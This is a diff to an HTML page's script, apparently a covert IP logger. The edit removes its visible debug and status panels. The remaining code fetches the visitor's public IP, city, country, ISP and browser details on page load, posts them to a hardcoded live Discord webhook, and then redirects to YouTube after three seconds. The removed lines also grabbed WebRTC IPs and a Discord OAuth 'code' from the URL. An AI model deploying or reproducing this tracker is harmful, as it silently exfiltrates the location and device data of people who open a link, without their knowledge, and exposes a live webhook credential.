@@ -26,265 +26,113 @@
 <body>
     <script>
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma";
-        let isCancelled = false;
-        let redirectTimer;
-        let collectedData = {};
-        
-        function log(message, type = 'info') {
-            const logDiv = document.getElementById('debug-log');
-            const time = new Date().toLocaleTimeString();
-            const logEntry = document.createElement('div');
-            logEntry.className = `log-entry log-${type}`;
-            logEntry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
-            logDiv.appendChild(logEntry);
-            logDiv.scrollTop = logDiv.scrollHeight;
-            console.log(`[${type.toUpperCase()}] ${message}`);
-        }
-        
-        function updateStatus(elementId, value, type = 'info') {
-            const element = document.getElementById(elementId);
-            if (element) {
-                element.textContent = value;
-                const card = element.closest('.status-card');
-                if (card) {
-                    card.className = `status-card ${type}`;
-                }
-            }
-        }
-        
-        function toggleDebug() {
-            const panel = document.getElementById('debug-panel');
-            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
-        }
         
         async function getRealIP() {
-            log('Starting IP detection...', 'info');
-            updateStatus('ip-value', 'Detecting...');
+            console.log('Getting IP address...');
             
-            try {
-                log('Trying public IP APIs...', 'info');
-                
-                const ipServices = [
-                    'https://api.ipify.org?format=json',
-                    'https://api64.ipify.org?format=json',
-                    'https://api.myip.com',
-                    'https://ipapi.co/json/',
-                    'https://ipinfo.io/json',
-                    'https://worldtimeapi.org/api/ip'
-                ];
-                
-                for (const service of ipServices) {
-                    try {
-                        log(`Trying: ${service}`, 'info');
-                        
-                        const controller = new AbortController();
-                        const timeout = setTimeout(() => controller.abort(), 3000);
-                        
-                        const response = await fetch(service, {
-                            signal: controller.signal
-                        });
-                        
-                        clearTimeout(timeout);
-                        
-                        if (response.ok) {
-                            const data = await response.json();
-                            const ip = data.ip || data.client_ip || data.query || 'Unknown';
-                            
-                            if (ip !== 'Unknown') {
-                                log(`IP found: ${ip}`, 'success');
-                                updateStatus('ip-value', ip, 'success');
-                                return ip;
-                            }
-                        }
-                    } catch (error) {
-                        log(`Service ${service} failed: ${error.message}`, 'warning');
-                        continue;
-                    }
-                }
-                
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://api.myip.com',
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json'
+            ];
+            
+            for (const service of ipServices) {
                 try {
-                    log('Trying WebRTC detection...', 'info');
-                    const rtcIP = await getWebRTCIP();
-                    if (rtcIP) {
-                        log(`IP from WebRTC: ${rtcIP}`, 'success');
-                        updateStatus('ip-value', `${rtcIP} (WebRTC)`, 'success');
-                        return rtcIP;
+                    console.log(`Trying: ${service}`);
+                    
+                    const response = await fetch(service);
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        const ip = data.ip || data.client_ip || data.query || 'Unknown';
+                        
+                        if (ip !== 'Unknown') {
+                            console.log(`IP found: ${ip}`);
+                            return ip;
+                        }
                     }
                 } catch (error) {
-                    log(`WebRTC failed: ${error.message}`, 'warning');
+                    console.log(`Service failed: ${error.message}`);
+                    continue;
                 }
-                
-                log('All methods failed', 'error');
-                updateStatus('ip-value', 'Unable to detect', 'error');
-                return 'Unknown';
-                
-            } catch (error) {
-                log(`IP detection error: ${error.message}`, 'error');
-                updateStatus('ip-value', 'Detection failed', 'error');
-                return 'Unknown';
             }
-        }
-        
-        function getWebRTCIP() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                
-                pc.onicecandidate = (ice) => {
-                    if (!ice.candidate) return;
-                    
-                    const candidate = ice.candidate.candidate;
-                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                    const match = candidate.match(ipRegex);
-                    
-                    if (match) {
-                        const ip = match[1];
-                        if (!ip.startsWith('192.168.') && 
-                            !ip.startsWith('10.') && 
-                            !ip.startsWith('172.16.') &&
-                            !ip.startsWith('172.17.') &&
-                            !ip.startsWith('172.18.') &&
-                            !ip.startsWith('172.19.') &&
-                            !ip.startsWith('172.20.') &&
-                            !ip.startsWith('172.21.') &&
-                            !ip.startsWith('172.22.') &&
-                            !ip.startsWith('172.23.') &&
-                            !ip.startsWith('172.24.') &&
-                            !ip.startsWith('172.25.') &&
-                            !ip.startsWith('172.26.') &&
-                            !ip.startsWith('172.27.') &&
-                            !ip.startsWith('172.28.') &&
-                            !ip.startsWith('172.29.') &&
-                            !ip.startsWith('172.30.') &&
-                            !ip.startsWith('172.31.')) {
-                            pc.close();
-                            resolve(ip);
-                        }
-                    }
-                };
-                
-                setTimeout(() => {
-                    pc.close();
-                    resolve(null);
-                }, 2000);
-            });
+            
+            return 'Unknown';
         }
         
         async function getGeoLocation(ip) {
             if (ip === 'Unknown' || ip.includes('192.168.') || ip.includes('127.0.0.1')) {
-                updateStatus('location-value', 'Local network', 'warning');
-                log('Skipping geolocation for local IP', 'warning');
                 return null;
             }
-            
-            updateStatus('location-value', 'Detecting location...');
-            log(`Getting geolocation for IP: ${ip}`, 'info');
             
             const geoServices = [
                 `https://ipapi.co/${ip}/json/`,
                 `https://ipwhois.app/json/${ip}`,
-                `https://ipinfo.io/${ip}/json`,
-                `https://geolocation-db.com/json/${ip}`
+                `https://ipinfo.io/${ip}/json`
             ];
             
             for (const service of geoServices) {
                 try {
-                    log(`Trying geolocation: ${service}`, 'info');
-                    
                     const response = await fetch(service);
                     if (response.ok) {
                         const data = await response.json();
                         
                         if (data.country || data.country_name) {
-                            const location = {
+                            return {
                                 country: data.country_name || data.country || 'Unknown',
                                 city: data.city || 'Unknown',
                                 region: data.region || data.regionName || 'Unknown',
-                                isp: data.org || data.isp || 'Unknown',
-                                countryCode: data.country_code || data.countryCode || 'Unknown'
+                                isp: data.org || data.isp || 'Unknown'
                             };
-                            
-                            const locationStr = `${location.city}, ${location.country}`;
-                            log(`Location found: ${locationStr}`, 'success');
-                            updateStatus('location-value', locationStr, 'success');
-                            
-                            return location;
                         }
                     }
                 } catch (error) {
-                    log(`Geolocation service failed: ${error.message}`, 'warning');
                     continue;
                 }
             }
             
-            updateStatus('location-value', 'Location unknown', 'warning');
-            log('All geolocation services failed', 'warning');
             return null;
         }
         
         function collectBrowserData() {
-            const urlParams = new URLSearchParams(window.location.search);
-            
-            const data = {
+            return {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: window.screen.colorDepth,
                 referrer: document.referrer || 'Direct',
-                cookies: navigator.cookieEnabled,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                discordCode: urlParams.get('code') || 'None',
                 hostname: window.location.hostname,
                 url: window.location.href,
-                timestamp: new Date().toISOString(),
-                doNotTrack: navigator.doNotTrack || 'Unknown',
-                plugins: navigator.plugins ? navigator.plugins.length : 0,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                vendor: navigator.vendor || 'Unknown'
+                timestamp: new Date().toISOString()
             };
-            
-            const browserStr = `${data.platform} - ${data.screen} - ${data.language}`;
-            updateStatus('browser-value', browserStr, 'success');
-            log(`Browser data collected: ${browserStr}`, 'success');
-            
-            return data;
         }
         
         async function sendToDiscord(data) {
-            updateStatus('status-value', 'Sending to Discord...');
-            log('Preparing Discord webhook payload...', 'info');
-            
-            if (!DISCORD_WEBHOOK || !DISCORD_WEBHOOK.includes('discord.com')) {
-                const errorMsg = 'Invalid Discord webhook URL';
-                updateStatus('status-value', errorMsg, 'error');
-                log(errorMsg, 'error');
-                return false;
-            }
+            console.log('Sending to Discord...');
             
             try {
                 const embed = {
-                    title: '🎯 NEW VISITOR LOGGED',
+                    title: '🔍 NEW VISITOR DETECTED',
                     color: 0xFF0000,
                     timestamp: data.browser.timestamp,
                     fields: [
                         {
                             name: '🌐 IP Address',
-                            value: `\`\`\`${data.ip}\`\`\``,
+                            value: `\`${data.ip}\``,
                             inline: true
                         },
                         {
                             name: '📍 Location',
                             value: data.geo ? 
-                                `**Country:** ${data.geo.country}\n**City:** ${data.geo.city}\n**ISP:** ${data.geo.isp}` :
-                                'Unable to determine location',
+                                `${data.geo.city}, ${data.geo.country}` :
+                                'Unable to determine',
                             inline: true
                         },
                         {
                             name: '🖥️ Device Info',
-                            value: `**Platform:** ${data.browser.platform}\n**Screen:** ${data.browser.screen}\n**Browser:** ${data.browser.userAgent.substring(0, 100)}...`,
+                            value: `${data.browser.platform} - ${data.browser.screen}`,
                             inline: false
                         },
                         {
@@ -296,30 +144,18 @@
                             name: '🌍 Website',
                             value: data.browser.hostname,
                             inline: true
-                        },
-                        {
-                            name: '🕒 Time',
-                            value: new Date(data.browser.timestamp).toLocaleString(),
-                            inline: true
-                        },
-                        {
-                            name: '📱 Additional Info',
-                            value: `**Timezone:** ${data.browser.timezone}\n**Language:** ${data.browser.language}\n**Cookies:** ${data.browser.cookies ? 'Enabled' : 'Disabled'}`,
-                            inline: false
                         }
                     ],
                     footer: {
-                        text: `IP Logger • ${data.browser.hostname}`
+                        text: 'IP Logger'
                     }
                 };
                 
                 const payload = {
                     embeds: [embed],
-                    username: '🔍 IP Tracker',
+                    username: 'IP Tracker',
                     avatar_url: 'https://cdn.discordapp.com/attachments/847471116316999690/894877973234393118/ezgif-4-b84848c6b4.gif'
                 };
-                
-                log(`Sending to Discord webhook...`, 'info');
                 
                 const response = await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
@@ -330,149 +166,44 @@
                 });
                 
                 if (response.ok) {
-                    updateStatus('status-value', 'Data sent to Discord!', 'success');
-                    log('Successfully sent to Discord!', 'success');
+                    console.log('Successfully sent to Discord!');
                     return true;
                 } else {
-                    const errorText = await response.text();
-                    updateStatus('status-value', `Discord error: ${response.status}`, 'error');
-                    log(`Discord error ${response.status}: ${errorText}`, 'error');
+                    console.log(`Discord error: ${response.status}`);
                     return false;
                 }
                 
             } catch (error) {
-                updateStatus('status-value', `Error: ${error.message}`, 'error');
-                log(`Discord send error: ${error.message}`, 'error');
+                console.log(`Send error: ${error.message}`);
                 return false;
             }
         }
         
         async function collectData() {
-            updateStatus('status-value', 'Starting data collection...');
-            log('STARTING DATA COLLECTION', 'info');
-            
             try {
                 const ip = await getRealIP();
                 const geo = await getGeoLocation(ip);
                 const browserData = collectBrowserData();
                 
-                collectedData = {
+                const collectedData = {
                     ip: ip,
                     geo: geo,
                     browser: browserData
                 };
                 
-                log('DATA COLLECTION COMPLETE', 'success');
-                
-                updateStatus('status-value', 'Sending to Discord...');
-                const sent = await sendToDiscord(collectedData);
-                
-                if (sent) {
-                    updateStatus('status-value', 'Complete! Redirecting...', 'success');
-                } else {
-                    updateStatus('status-value', 'Collected (Discord failed)', 'warning');
-                }
-                
-                return collectedData;
+                await sendToDiscord(collectedData);
                 
             } catch (error) {
-                updateStatus('status-value', `Error: ${error.message}`, 'error');
-                log(`Collection error: ${error.message}`, 'error');
-                return null;
+                console.log(`Error: ${error.message}`);
             }
         }
         
-        async function testDiscord() {
-            log('TESTING DISCORD WEBHOOK', 'info');
+        window.addEventListener('load', () => {
+            collectData();
             
-            const testData = {
-                ip: '8.8.8.8',
-                geo: {
-                    country: 'United States',
-                    city: 'Mountain View',
-                    isp: 'Google LLC'
-                },
-                browser: {
-                    platform: 'Test Platform',
-                    screen: '1920x1080',
-                    userAgent: 'Test User Agent',
-                    hostname: window.location.hostname,
-                    timestamp: new Date().toISOString()
-                }
-            };
-            
-            updateStatus('status-value', 'Testing Discord webhook...');
-            const result = await sendToDiscord(testData);
-            
-            if (result) {
-                alert('Test successful! Check your Discord channel.');
-            } else {
-                alert('Test failed. Check debug panel for details.');
-            }
-        }
-        
-        function startRedirect() {
-            let seconds = 3;
-            const countdownElement = document.getElementById('countdown');
-            
-            const countdownInterval = setInterval(() => {
-                if (seconds >= 0) {
-                    countdownElement.textContent = `Redirecting in ${seconds} second${seconds !== 1 ? 's' : ''}...`;
-                    seconds--;
-                } else {
-                    clearInterval(countdownInterval);
-                }
-            }, 1000);
-            
-            redirectTimer = setTimeout(() => {
-                if (!isCancelled) {
-                    log('Performing redirect to YouTube...', 'info');
-                    window.location.href = 'https://www.youtube.com';
-                }
+            setTimeout(() => {
+                window.location.href = 'https://www.youtube.com';
             }, 3000);
-        }
-        
-        function cancelRedirect() {
-            isCancelled = true;
-            clearTimeout(redirectTimer);
-            
-            updateStatus('status-value', 'Redirect cancelled', 'warning');
-            document.getElementById('countdown').textContent = 'Redirect CANCELLED';
-            document.getElementById('countdown').style.color = '#ff4444';
-            
-            log('Redirect cancelled by user', 'warning');
-            
-            const manualBtn = document.createElement('button');
-            manualBtn.className = 'btn btn-green';
-            manualBtn.innerHTML = '🚀 Go to YouTube Now';
-            manualBtn.onclick = () => window.location.href = 'https://www.youtube.com';
-            manualBtn.style.marginTop = '15px';
-            document.querySelector('.button-group').appendChild(manualBtn);
-        }
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            log('IP Logger started', 'success');
-            log(`Hostname: ${window.location.hostname}`, 'info');
-            log(`User Agent: ${navigator.userAgent}`, 'info');
-            
-            setTimeout(async () => {
-                await collectData();
-            }, 1000);
-            
-            startRedirect();
-            
-            document.addEventListener('keydown', (e) => {
-                if (e.key === 'd' || e.key === 'D') toggleDebug();
-                if (e.key === 'Escape') cancelRedirect();
-                if (e.key === 't' || e.key === 'T') testDiscord();
-                if (e.key === 'r' || e.key === 'R') collectData();
-            });
-        });
-        
-        window.addEventListener('beforeunload', () => {
-            if (collectedData.ip && collectedData.ip !== 'Unknown') {
-                log(`User exited at ${new Date().toLocaleTimeString()}`, 'info');
-            }
         });
     </script>
 </body>
